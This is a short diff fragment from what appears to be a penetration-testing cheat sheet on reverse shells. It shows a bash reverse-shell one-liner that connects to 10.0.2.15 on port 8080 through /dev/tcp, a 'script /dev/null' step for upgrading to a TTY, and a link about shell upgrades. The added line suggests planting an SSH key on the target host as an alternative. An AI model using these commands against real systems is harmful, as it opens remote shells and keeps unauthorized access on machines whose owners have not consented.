@@ -60,6 +60,7 @@ bash -i > /dev/tcp/10.0.2.15/8080 0<&1 2>&1
 script /dev/null
 
 # Upgrading to tty
+# Alternative: drop ssh key in target_host
 
 # ||
 # https://steemit.com/hacking/@synapse/hacking-getting-a-functional-tty-from-a-reverse-shell
